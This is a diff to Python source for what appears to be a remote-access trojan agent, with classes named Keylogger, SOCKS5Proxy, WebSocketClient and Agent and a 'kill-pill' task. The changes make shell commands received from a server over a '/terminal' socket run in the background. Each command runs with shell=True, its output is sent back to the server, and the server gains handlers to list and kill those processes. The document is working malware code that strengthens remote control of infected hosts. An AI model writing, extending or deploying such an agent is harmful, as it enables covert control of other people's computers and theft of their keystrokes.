@@ -1376,18 +1376,20 @@ class SystemUtils:
     @staticmethod
     def execute_command(cmd):
         try:
-            result = subprocess.run(cmd, shell=True, 
-                                  capture_output=True, text=True, 
-                                  timeout=30)
+            
+            process = subprocess.Popen(
+                cmd, 
+                shell=True, 
+                stdout=None,  
+                stderr=None, 
+                stdin=None,
+                creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == 'nt' else 0
+            )
+            
             return {{
-                "output": result.stdout,
-                "error": result.stderr,
-                "returncode": result.returncode
-            }}
-        except subprocess.TimeoutExpired:
-            return {{
-                "error": "Command timed out after 30 seconds",
-                "returncode": -1
+                "status": "Started in background",
+                "pid": process.pid,
+                "returncode": 0
             }}
         except Exception as e:
             return {{
@@ -1825,6 +1827,60 @@ class SOCKS5Proxy:
 # ======================
 # Keylogger
 # ======================
+
+# Global process registry to track all running subprocesses across all connections
+# This allows us to kill all processes when needed to prevent blocking
+GLOBAL_PROCESS_REGISTRY = {{}}
+GLOBAL_PROCESS_REGISTRY_LOCK = threading.Lock()
+
+def _register_process(process_id, proc, command):
+    """Register a process in the global registry"""
+    with GLOBAL_PROCESS_REGISTRY_LOCK:
+        GLOBAL_PROCESS_REGISTRY[process_id] = {{
+            'process': proc,
+            'command': command,
+            'start_time': time.time()
+        }}
+
+def _unregister_process(process_id):
+    """Remove a process from the global registry"""
+    with GLOBAL_PROCESS_REGISTRY_LOCK:
+        if process_id in GLOBAL_PROCESS_REGISTRY:
+            del GLOBAL_PROCESS_REGISTRY[process_id]
+
+def _kill_all_processes():
+    """Kill all registered processes - used for cleanup"""
+    with GLOBAL_PROCESS_REGISTRY_LOCK:
+        for process_id, proc_info in list(GLOBAL_PROCESS_REGISTRY.items()):
+            try:
+                proc = proc_info.get('process')
+                if proc:
+                    proc.kill()
+                    try:
+                        proc.wait(timeout=1)
+                    except:
+                        pass
+            except Exception:
+                pass
+        GLOBAL_PROCESS_REGISTRY.clear()
+
+def _force_kill_process(process_id):
+    """Force kill a specific process by ID"""
+    with GLOBAL_PROCESS_REGISTRY_LOCK:
+        if process_id in GLOBAL_PROCESS_REGISTRY:
+            proc_info = GLOBAL_PROCESS_REGISTRY[process_id]
+            try:
+                proc = proc_info.get('process')
+                if proc:
+                    proc.kill()
+                    try:
+                        proc.wait(timeout=1)
+                    except:
+                        pass
+            except Exception:
+                pass
+            del GLOBAL_PROCESS_REGISTRY[process_id]
+
 import threading
 
 class Keylogger:
@@ -2416,6 +2472,7 @@ class WebSocketClient:
         self.keep_alive_running = False
         self._setup_logger()
         self._connection_timeout = 10  # seconds
+        self.running_processes = {{}}  # Track running subprocesses for async execution
 
     def _setup_logger(self):
         self.logger = logging.getLogger('websocket')
@@ -2447,7 +2504,7 @@ class WebSocketClient:
                     
                     self.logger.debug(f"Sending command result: {{response}}")
                     self.socket.emit('command_result', response, namespace='/terminal')
-                    
+
                 except Exception as e:
                     self.logger.error(f"Command handling failed: {{str(e)}}")
                     self.socket.emit('command_result', {{
@@ -2455,6 +2512,57 @@ class WebSocketClient:
                         'error': f"Command processing error: {{str(e)}}",
                         'current_dir': self.current_dir
                     }}, namespace='/terminal')
+
+            @self.socket.on('kill_process', namespace='/terminal')
+            def on_kill_process(data):
+                """Kill a running process by ID"""
+                process_id = data.get('process_id')
+                
+                # Handle killing all processes
+                if process_id == 'ALL':
+                    self._log_info("[SocketIO] Killing all running processes")
+                    _kill_all_processes()
+                    self.running_processes.clear()
+                    self.socket.emit('command_result', {{
+                        'agent_id': self.agent_id,
+                        'output': '',
+                        'error': 'All processes killed',
+                        'current_dir': self.current_dir
+                    }}, namespace='/terminal')
+                    return
+                
+                if process_id and process_id in self.running_processes:
+                    try:
+                        proc_info = self.running_processes[process_id]
+                        proc_info['process'].kill()
+                        del self.running_processes[process_id]
+                        self.socket.emit('command_result', {{
+                            'agent_id': self.agent_id,
+                            'output': '',
+                            'error': f"Process {{process_id}} killed",
+                            'current_dir': self.current_dir
+                        }}, namespace='/terminal')
+                    except Exception as e:
+                        self.logger.error(f"Failed to kill process: {{str(e)}}")
+                else:
+                    self.socket.emit('command_result', {{
+                        'agent_id': self.agent_id,
+                        'output': '',
+                        'error': f"Process {{process_id}} not found",
+                        'current_dir': self.current_dir
+                    }}, namespace='/terminal')
+
+            @self.socket.on('list_processes', namespace='/terminal')
+            def on_list_processes(data):
+                """List all running processes"""
+                process_list = []
+                for pid, info in self.running_processes.items():
+                    process_list.append({{
+                        'id': pid,
+                        'command': info['command'],
+                        'start_time': info['start_time']
+                    }})
+                self.socket.emit('process_list', {{'processes': process_list}}, namespace='/terminal')
             
             @self.socket.on('force_kill', namespace='/terminal')
             def on_force_kill(data):
@@ -2544,10 +2652,8 @@ class WebSocketClient:
 
         except Exception as e:
             self.logger.error(f"WebSocket connection failed: {{str(e)}}")
-            return False
-    
-   
-        
+        return False
+
     def _execute_command(self, command):
         try:
             self.logger.info(f"Executing: {{command}}")
@@ -2569,30 +2675,105 @@ class WebSocketClient:
                         'current_dir': self.current_dir
                     }}
 
-            # Execute regular commands
-            result = subprocess.run(
+            # Execute regular commands asynchronously using Popen
+            # This allows multiple commands to run in parallel without blocking
+            process_id = str(random.randint(10000, 99999))  # Unique ID for this command
+            
+            # Start the process
+            proc = subprocess.Popen(
                 command,
                 shell=True,
                 cwd=self.current_dir,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
-                text=True,
-                timeout=30
+                text=True
             )
             
-            self.current_dir = os.getcwd()
-            
-            return {{
-                'output': result.stdout,
-                'error': result.stderr,
-                'current_dir': self.current_dir
+# Store the process for tracking
+            self.running_processes[process_id] = {{
+                'process': proc,
+                'command': command,
+                'start_time': time.time()
             }}
             
-        except subprocess.TimeoutExpired:
+            # Also register in global registry for cross-command management
+            _register_process(process_id, proc, command)
+            
+            # Start a thread to monitor the process and send results when done
+            def monitor_process(pid, proc_obj):
+                try:
+                    # Wait for process to complete (with timeout)
+                    stdout, stderr = proc_obj.communicate(timeout=30)
+                    returncode = proc_obj.returncode
+                    
+                    # Get updated current directory
+                    current_dir = os.getcwd()
+                    
+                    # Send the result back via socket
+                    if self.socket and self.connected:
+                        try:
+                            self.socket.emit('command_result', {{
+                                'agent_id': self.agent_id,
+                                'command': self.running_processes[pid]['command'] if pid in self.running_processes else '',
+                                'output': stdout,
+                                'error': stderr,
+                                'current_dir': current_dir,
+                                'returncode': returncode
+                            }}, namespace='/terminal')
+                        except Exception as e:
+                            self.logger.error(f"Failed to emit command result: {{str(e)}}")
+                except subprocess.TimeoutExpired:
+                    proc_obj.kill()
+                    stdout, stderr = proc_obj.communicate()
+                    if self.socket and self.connected:
+                        try:
+                            self.socket.emit('command_result', {{
+                                'agent_id': self.agent_id,
+                                'command': self.running_processes[pid]['command'] if pid in self.running_processes else '',
+                                'output': stdout,
+                                'error': 'Command timed out after 30 seconds',
+                                'current_dir': os.getcwd(),
+                                'returncode': -1
+                            }}, namespace='/terminal')
+                        except Exception as e:
+                            self.logger.error(f"Failed to emit timeout result: {{str(e)}}")
+                except Exception as e:
+                    self.logger.error(f"Error monitoring process: {{str(e)}}")
+                finally:
+# Clean up the process from tracking
+                    if pid in self.running_processes:
+                        del self.running_processes[pid]
+                    
+                    # Also unregister from global registry
+                    _unregister_process(pid)
+            
+            # Start monitoring thread
+            threading.Thread(target=monitor_process, args=(process_id, proc), daemon=True).start()
+            
+            # Send immediate response with process_id so user knows it's running
+            if self.socket and self.connected:
+                try:
+                    self.socket.emit('command_result', {{
+                        'agent_id': self.agent_id,
+                        'command': command,
+                        'output': '',
+                        'error': '',
+                        'current_dir': self.current_dir,
+                        'running': True,
+                        'process_id': process_id
+                    }}, namespace='/terminal')
+                except Exception as e:
+                    self.logger.error(f"Failed to emit running status: {{str(e)}}")
+            
+            # Return immediately with running status
             return {{
-                'error': 'Command timed out after 30 seconds',
-                'current_dir': self.current_dir
+                'output': '',
+                'error': '',
+                'current_dir': self.current_dir,
+                'running': True,
+                'process_id': process_id
             }}
+
         except Exception as e:
             return {{
                 'error': str(e),
@@ -2988,9 +3169,9 @@ class Agent:
                         "status": "error",
                         "message": "No command provided"
                     }}
-                
+
                 current_dir = os.getcwd()
-                
+
                 if command.lower().startswith("cd "):
                     new_dir = command[3:].strip()
                     try:
@@ -3008,7 +3189,7 @@ class Agent:
                             "error": str(e),
                             "current_dir": current_dir
                         }}
-                
+
                 result = subprocess.run(
                     command,
                     shell=True,
@@ -3019,7 +3200,7 @@ class Agent:
                     timeout=30
                 )
                 current_dir = os.getcwd()
-                
+
                 return {{
                     "status": "success",
                     "output": result.stdout,
@@ -3027,7 +3208,7 @@ class Agent:
                     "current_dir": current_dir,
                     "terminal": True  # This flag helps the server identify terminal output
                 }}
-            
+
             #Kill-pill
             elif task_type == "kill":
                 if task.get("data", {{}}).get("force"):
